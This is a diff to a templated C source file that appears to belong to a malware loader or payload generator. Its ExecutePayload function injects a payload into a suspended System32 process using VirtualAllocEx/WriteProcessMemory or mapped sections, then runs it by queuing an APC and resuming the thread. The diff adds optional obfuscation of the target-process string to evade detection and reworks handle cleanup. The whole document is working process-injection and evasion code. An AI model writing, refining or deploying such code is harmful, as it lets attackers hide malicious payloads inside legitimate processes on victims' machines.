@@ -14,7 +14,18 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
     }
 
     char sSystem32[] = "\\System32\\";
+    
+    {% if obfuscate_execution_strings %}
+    unsigned char sTargetProcess_obfuscated[] = { {{ target_process_obfuscated }} };
+    char sTargetProcess[sizeof(sTargetProcess_obfuscated)];
+    
+    pfnRtlMoveMemory(sTargetProcess, sTargetProcess_obfuscated, sizeof(sTargetProcess_obfuscated));
+    DeobfuscateString((unsigned char*)sTargetProcess, sizeof(sTargetProcess_obfuscated));
+    
+    DEBUG_PRINT("Deobfuscated target process name");
+    {% else %}
     char sTargetProcess[] = "{{ target_process }}";
+    {% endif %}
 
     size_t sWnDrLen = pfnLstrlenA(WnDr);
     size_t sSystem32Len = pfnLstrlenA(sSystem32);
@@ -27,6 +38,11 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
     lpPath[sWnDrLen + sSystem32Len + sTargetProcessLen] = '\0';
     
     DEBUG_PRINT("Constructed path: '%s'", lpPath);
+
+    {% if obfuscate_execution_strings %}
+    pfnRtlZeroMemory(sTargetProcess, sizeof(sTargetProcess));
+    {% endif %}
+
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     pfnRtlZeroMemory(&si, sizeof(si));
@@ -36,7 +52,6 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
     if (!pfnCreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         DEBUG_PRINT("CreateProcessA failed with error: %d", pfnGetLastError());
         goto cleanup_strings;
-        return;
     }
     hProcess = pi.hProcess;
     hThread = pi.hThread;
@@ -49,15 +64,15 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
         pRemoteAddress = pfnVirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (pRemoteAddress == NULL) {
             DEBUG_PRINT("VirtualAllocEx failed with error: %d", pfnGetLastError());
-            pfnCloseHandle(hThread); pfnCloseHandle(hProcess); goto cleanup_strings; return;
+            goto cleanup;
         }
         if (!pfnWriteProcessMemory(hProcess, pRemoteAddress, payload, payload_len, NULL)) {
             DEBUG_PRINT("WriteProcessMemory failed with error: %d", pfnGetLastError());
-            pfnCloseHandle(hThread); pfnCloseHandle(hProcess); goto cleanup_strings; return;
+            goto cleanup;
         }
         if (!pfnVirtualProtectEx(hProcess, pRemoteAddress, payload_len, PAGE_EXECUTE_READ, &dwOldProt)) {
             DEBUG_PRINT("VirtualProtectEx failed with error: %d", pfnGetLastError());
-            pfnCloseHandle(hThread); pfnCloseHandle(hProcess); goto cleanup_strings; return;
+            goto cleanup;
         }
     {% elif allocation_method == 'mappedsection' %}
         DEBUG_PRINT("Using Mapped Sections for remote memory allocation...");
@@ -69,13 +84,14 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
         pfnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
         if (hSection == NULL) {
             DEBUG_PRINT("NtCreateSection failed.");
-            pfnCloseHandle(hThread); pfnCloseHandle(hProcess); goto cleanup_strings; return;
+            goto cleanup;
         }
         
         pfnNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalAddress, 0, 0, NULL, (PSIZE_T)&payload_len, 2, 0, PAGE_READWRITE);
         if (pLocalAddress == NULL) {
             DEBUG_PRINT("Local NtMapViewOfSection failed.");
-            pfnCloseHandle(hSection); pfnCloseHandle(hThread); pfnCloseHandle(hProcess); goto cleanup_strings; return;
+            pfnCloseHandle(hSection);
+            goto cleanup;
         }
         
         pfnRtlMoveMemory(pLocalAddress, payload, payload_len);
@@ -83,8 +99,10 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
         pfnNtMapViewOfSection(hSection, hProcess, &pRemoteAddress, 0, 0, NULL, (PSIZE_T)&payload_len, 2, 0, PAGE_EXECUTE_READ);
         if (pRemoteAddress == NULL) {
             DEBUG_PRINT("Remote NtMapViewOfSection failed.");
-            pfnCloseHandle(hSection); pfnCloseHandle(hThread); pfnCloseHandle(hProcess); goto cleanup_strings; return;
+            pfnCloseHandle(hSection);
+            goto cleanup;
         }
+        pfnCloseHandle(hSection);
     {% endif %}
 
     DEBUG_PRINT("Queuing APC to thread %p to run payload at %p", hThread, pRemoteAddress);
@@ -94,15 +112,24 @@ void ExecutePayload(void* exec_mem_unused, const unsigned char* payload, SIZE_T 
     pfnResumeThread(hThread);
 
     DEBUG_PRINT("Suspended Process APC modification complete.");
-    
-    pfnCloseHandle(hThread);
-    pfnCloseHandle(hProcess);
+
+cleanup:
+    if (hThread) {
+        pfnCloseHandle(hThread);
+    }
+    if (hProcess) {
+        pfnCloseHandle(hProcess);
+    }
 
 cleanup_strings:
     pfnRtlZeroMemory(WnDr, sizeof(WnDr));
     pfnRtlZeroMemory(lpPath, sizeof(lpPath));
     pfnRtlZeroMemory(sSystem32, sizeof(sSystem32));
+    {% if obfuscate_execution_strings %}
+    pfnRtlZeroMemory(sTargetProcess_obfuscated, sizeof(sTargetProcess_obfuscated));
+    {% else %}
     pfnRtlZeroMemory(sTargetProcess, sizeof(sTargetProcess));
+    {% endif %}
     
     DEBUG_PRINT("String cleanup complete.");
 }
